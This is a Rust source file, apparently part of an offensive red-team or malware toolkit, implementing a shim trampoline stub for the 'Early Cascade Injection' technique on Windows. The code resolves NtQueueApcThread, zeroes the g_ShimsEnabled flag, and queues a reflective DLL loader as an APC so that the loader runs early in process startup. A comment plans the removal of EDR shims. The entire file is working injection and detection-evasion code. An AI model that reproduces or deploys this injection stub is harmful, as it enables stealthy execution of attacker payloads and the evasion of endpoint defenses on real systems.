//! This is a shellcode (no_std rust near enough == shellcode just not hand coded) stub in the rDLL for Early Cascade
//! Injection which makes life easier rather than hand writing shellcode, or using an engine to do so.

use core::ffi::c_void;

use shared_no_std::{export_resolver::resolve_address, memory::locate_shim_pointers};

use crate::stubs::rdi::Load;

#[repr(u32)]
enum ShimHardReturnErrors {
    Success = 0,
    NtQueueApcThreadNotFound = 1,
    ShimPtrsNotFound,
}

// ty https://ntdoc.m417z.com/ntqueueapcthread
type NtQueueApcThread = unsafe extern "system" fn(
    thread_handle: isize,
    apc_routine: *const c_void,
    arg1: usize,
    arg2: usize,
    arg3: usize,
) -> u32;

/// Context independent stub that acts as a 'shim trampoline' which will execute when we set up the shim mechanism
/// with g_ShimsEnabled == 1 and g_pfnSE_DllLoaded == address of Shim().
#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub extern "system" fn Shim() -> u32 {
    let p_nt_queue_apc_thread =
        resolve_address("ntdll.dll", "NtQueueApcThread", None).unwrap_or_default();

    if p_nt_queue_apc_thread.is_null() {
        return ShimHardReturnErrors::NtQueueApcThreadNotFound as _;
    }

    let Ok(shim_ptrs) = locate_shim_pointers() else {
        return ShimHardReturnErrors::ShimPtrsNotFound as _;
    };

    //
    // Patch shim flag as per
    // https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/
    //

    let val = 0u8;
    unsafe { core::ptr::write_unaligned(shim_ptrs.p_g_shims_enabled, val) };

    // TODO further search for EDR shims, and remove - make optional?

    //
    // Queue our reflective loader as an APC via NtQueueApcThread
    //

    let current_thread = -2isize;
    let apc_routine = Load as *const c_void;
    let apc_arg1 = 0usize;
    let apc_arg2 = 0usize;
    let apc_arg3 = 0usize;

    //
    // Queue the rDLL stub as an APC which will fire on NtTestAlert after ntdll has finished its biz
    //
    let NtQueueApcThread =
        unsafe { core::mem::transmute::<_, NtQueueApcThread>(p_nt_queue_apc_thread) };

    let res =
        unsafe { NtQueueApcThread(current_thread, apc_routine, apc_arg1, apc_arg2, apc_arg3) };

    if res != 0 {
        res
    } else {
        ShimHardReturnErrors::Success as _
    }
}
